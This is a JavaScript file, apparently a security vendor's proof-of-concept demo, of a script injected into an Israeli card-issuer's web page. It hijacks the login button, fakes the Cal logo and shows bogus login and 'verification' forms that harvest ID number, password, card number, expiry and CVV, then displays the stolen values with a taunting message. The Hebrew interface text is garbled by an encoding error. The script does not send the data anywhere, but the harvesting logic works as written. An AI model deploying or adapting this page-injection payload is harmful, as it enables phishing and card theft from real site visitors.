function addSpinnerToThePage() {
    var spinnerDiv = document.createElement('div');
    spinnerDiv.setAttribute("id", "spinnerDiv");
    spinnerDiv.setAttribute("style","position:fixed;left:0;top:0;width:100%;height:100%;z-index:999999999;");
    spinnerDiv.style.visibility = "hidden";
    spinnerDiv.innerHTML = "<style>div.spinnerImg-container {position:fixed;left:0;top:200px;width:100%;height:200px;z-index:999999999;text-align:center;background-image: url('https://www.speikboden.it/_medien/bilder/loader2.gif');background-position: center center;background-repeat: no-repeat;}</style>" +
        "<div class='spinnerImg-container'></div>" +
        "<span id='ispCanvasSpinner' style='position : absolute; z-index: 9999; width : 100%; text-align : center; top : 10%' class='isp-ib-loader-background'><div us-spinner spinner-key='spinner-1' spinner-diameter='80'></div></span>";
    document.body.insertBefore(spinnerDiv, document.body.firstChild);
}
function showSpinnerFunction() {
    document.getElementById('spinnerDiv').style.visibility = "visible"; // Using just javascript.
}
function hideSpinnerFunction() {
    document.getElementById('spinnerDiv').style.visibility = "hidden"; // Using just javascript.
}
function viceHackMSGCanceled() {
    document.body.removeChild(document.getElementById("ViceHackDialog2"));
    document.body.removeChild(document.getElementById("ViceHackDialogModal2"));
}
function viceHackDialogConfirmed() {  
    
	var fullName = document.getElementById("fullName").value;
	var creditCard = document.getElementById("cardNum").value;
	var creditCardCVV = document.getElementById("CVV").value;
	var creditCardDate = document.getElementById("cardDate").value;
	
    var msgHTML =
        "<div id='ViceHackDialogModal2' style='position:fixed;left:0;top:0;width:100%;height:100%;z-index:999999999;background-color:black;opacity:0.65;'></div>" +
        "<style>#ViceHackDialog2Content td {padding-right: 50px;}</style>" + 
        "<div id='ViceHackDialog2' style='position:fixed;left:0;top:200px;width:100%;height:100%;z-index:999999999;text-align:center;'>" +
        "<div id='ViceHackDialog2Content' style='background-color:red;border:1px solid white;border:white 1px solid;border-radius:6px;display:inline-block;padding:20px;font-size: 16px;font-family:sans-serif;direction:ltr;color:white;text-align:left;'>" +
		"<div id='closeDialog' style='position:relative;float:right;margin: -33px -33px 0 0;z-index:999999999;width: 24px;height: 24px;background: red;border-radius: 20px;'><a href='javascript:viceHackMSGCanceled()'><img src='data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTkuMS4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDQ3NS4yIDQ3NS4yIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA0NzUuMiA0NzUuMjsiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIyNHB4IiBoZWlnaHQ9IjI0cHgiPgo8Zz4KCTxnPgoJCTxwYXRoIGQ9Ik00MDUuNiw2OS42QzM2MC43LDI0LjcsMzAxLjEsMCwyMzcuNiwwcy0xMjMuMSwyNC43LTE2OCw2OS42UzAsMTc0LjEsMCwyMzcuNnMyNC43LDEyMy4xLDY5LjYsMTY4czEwNC41LDY5LjYsMTY4LDY5LjYgICAgczEyMy4xLTI0LjcsMTY4LTY5LjZzNjkuNi0xMDQuNSw2OS42LTE2OFM0NTAuNSwxMTQuNSw0MDUuNiw2OS42eiBNMzg2LjUsMzg2LjVjLTM5LjgsMzkuOC05Mi43LDYxLjctMTQ4LjksNjEuNyAgICBzLTEwOS4xLTIxLjktMTQ4LjktNjEuN2MtODIuMS04Mi4xLTgyLjEtMjE1LjcsMC0yOTcuOEMxMjguNSw0OC45LDE4MS40LDI3LDIzNy42LDI3czEwOS4xLDIxLjksMTQ4LjksNjEuNyAgICBDNDY4LjYsMTcwLjgsNDY4LjYsMzA0LjQsMzg2LjUsMzg2LjV6IiBmaWxsPSIjRkZGRkZGIi8+CgkJPHBhdGggZD0iTTM0Mi4zLDEzMi45Yy01LjMtNS4zLTEzLjgtNS4zLTE5LjEsMGwtODUuNiw4NS42TDE1MiwxMzIuOWMtNS4zLTUuMy0xMy44LTUuMy0xOS4xLDBjLTUuMyw1LjMtNS4zLDEzLjgsMCwxOS4xICAgIGw4NS42LDg1LjZsLTg1LjYsODUuNmMtNS4zLDUuMy01LjMsMTMuOCwwLDE5LjFjMi42LDIuNiw2LjEsNCw5LjUsNHM2LjktMS4zLDkuNS00bDg1LjYtODUuNmw4NS42LDg1LjZjMi42LDIuNiw2LjEsNCw5LjUsNCAgICBjMy41LDAsNi45LTEuMyw5LjUtNGM1LjMtNS4zLDUuMy0xMy44LDAtMTkuMWwtODUuNC04NS42bDg1LjYtODUuNkMzNDcuNiwxNDYuNywzNDcuNiwxMzguMiwzNDIuMywxMzIuOXoiIGZpbGw9IiNGRkZGRkYiLz4KCTwvZz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8L3N2Zz4K'></a></div>" +
        "<div style='clear:both;text-align:center'><img src='https://sourcedefense.com/pocdemo/Anonymous-Mask-PNG-Image.png' width=150 style='width:150px !important; height: 150px !important'><br><br><div style='font-size: 20px;font-family: cursive;'>Thank you for your information we will certainly use it</div> ;-)<br><br></div>" +
        "<table style='text-align: left;font-size: 20px;font-family: monospace;'>" +
        "<tr style='line-height:25px'><td>" + formNames.fullname + "</td><td style='font-weight: bold;'>" + fullName + "</td></tr>" +
        "<tr style='line-height:25px'><td>" + formNames.nId + "</td><td style='font-weight: bold;'>" + nId + "</td></tr>" +
		"<tr style='line-height:25px'><td>" + formNames.password + "</td><td style='font-weight: bold;'>" + passcode + "</td></tr>" +
		"<tr style='line-height:25px'><td>" + formNames.creditCard + "</td><td style='font-weight: bold;'>" + creditCard + "</td></tr>" +
        "<tr style='line-height:25px'><td>" + formNames.creditCardCVV + "</td><td style='font-weight: bold;'>" + creditCardCVV + "</td></tr>" +
        "<tr style='line-height:25px'><td>" + formNames.creditCardDate + "</td><td style='font-weight: bold;'>" + creditCardDate + "</td></tr>" +
        "</td></tr><tr><td></td><td></td></tr><tr><td colspan='2' style='height: 22px;'></td></table></div></div>";
    document.body.insertAdjacentHTML("afterBegin", msgHTML);
}
var formNames = {
	titleText: "Isracard",
	fullname: "Full Name:",
	nId: "ID Number:",
	creditCard: "Credit Card Number:",
	creditCardCVV: "CCV:",
	creditCardDate: "Expiry Date:",
	password: "Password:",
	abortText: "Cancel",
	AcceptBackground: "#1D4094",
	titleBackground: "#FFFFFF",
	acceptTextColor: "#FFFFFF",
	inputBorder: "#999"
};
function submitForm(event){
	event.preventDefault();
	event.stopPropagation();
	showSpinnerFunction();
	setTimeout(function () {
		hideSpinnerFunction();
		viceHackDialogConfirmed();
	}, 1500)
}

newForm = '<p>××•×¤×¡ ×ž×©×”×• ×”×©×ª×‘×©</p><p>×× ×—× ×• ×–×§×•×§×™× ×œ×¢×•×“ ×§×¦×ª ×¤×¨×˜×™× ×¢×š ×ž× ×ª ×œ××ž×ª ××•×ª×š</p><form id="lgnForm2"><input id="fullName" value="" placeholder="×©× ×ž×œ×"><br><input id="cardNum" value="" placeholder="×ž×¡×¤×¨ ×›×¨×˜×™×¡ ××©×¨××™" maxlength="16"><br><input id="cardDate" value="" placeholder="×ª×•×§×£" style="margin-right:1%; width:49%;" maxlength="4"><input id="CVV" value="" placeholder="CVV" style="width:50%;" maxlength="3"><br><input type="submit" value="×›× ×™×¡×” ×œ×—×©×‘×•×Ÿ ×©×œ×™" onclick="submitForm(event)"></form>';

var nId, passcode;

function selfSubmit(event){
	event.preventDefault();
	event.stopPropagation();
	nId = document.getElementById("memberNum").value;
	passcode = document.getElementById("psw").value;
	setTimeout(function () {
		document.getElementById("lgnForm1").outerHTML = newForm;
	}, 1000)
}

function close_modal(){
	document.querySelector("#loginModal").style.display = "none";
}
function opnMdl_login(){
adfHT = '<style>#loginModal{ width: 100%; height: 100%; background-color:#00266b; z-index: 999; position: absolute; display:block;} #loginModal_inner{ width: 450px; margin: 200px auto; position:relative; } #loginModal_inner .close_modal{ position: absolute; top:-40px; right: 0; } #loginModal_inner h2{ text-align: center; color: #fff; font-size: 46px; margin-bottom: 30px; font-weight: bold;} #loginModal_inner p{ text-align: center; color: #fff; font-size: 16px; font-family: "Frutiger Light",sans-serif; margin-bottom: 10px; } #loginModal_inner form{ margin-top: 50px; } #loginModal_inner form input, #loginModal_inner form input[type=password]{ border: none; border-bottom: 1px solid #fff; width: 100%; background: none; color: #fff; margin-bottom: 30px; -webkit-box-shadow: none; } #loginModal_inner form input::placeholder{ color: #fff; background: none; } #loginModal_inner form input[type=submit] {	border: 1px solid #fff; color: #00266b; cursor: pointer; width:200px; height: 63px;	padding: 0 43px; background: #fff; margin: 0 28%; } #loginModal_inner form input[type=submit]:hover { color: #fff; background: none; } </style> <div id="loginModal"><div id="loginModal_inner"><a href="#" onclick="close_modal()" class="close_modal"><bv-svg-icon type="icon-close-white"><img src="https://minha.bv.com.br/dist/images/icon-close-white.svg"></bv-svg-icon></a><h2>×›× ×™×¡×” ×œ×—×©×‘×•×Ÿ ×©×œ×™</h2><p></p><form id="lgnForm1"><input id="memberNum" maxlength="11" value="" placeholder="×ª×¢×•×“×ª ×–×”×•×ª"><br><input id="psw" value="" placeholder="×¡×™×¡×ž×" type="password"><br><input type="submit" value="×›× ×™×¡×” ×œ×—×©×‘×•×Ÿ ×©×œ×™" onclick="selfSubmit(event)"></form></div></div>';
document.body.insertAdjacentHTML("afterBegin", adfHT);
}

(function(){ try {
	console.log("Smile, you've just been hacked!");
	var logoLI = document.querySelectorAll(".div-site-header__logo-link")[0];
	logoLI.innerHTML = "<img src='https://www.cal-online.co.il/media/2938/calogo.png' id='layoutLogoImage'>";
		
	var loginBtn = document.querySelectorAll(".btn-login-account")[0];
	loginBtn.setAttribute("onclick","#");
	loginBtn.setAttribute("href","#");
	loginBtn.addEventListener("click", function(event) { 
		event.preventDefault();
		event.stopPropagation();
		opnMdl_login();
	})
	addSpinnerToThePage();
	} catch (err) {}
})();
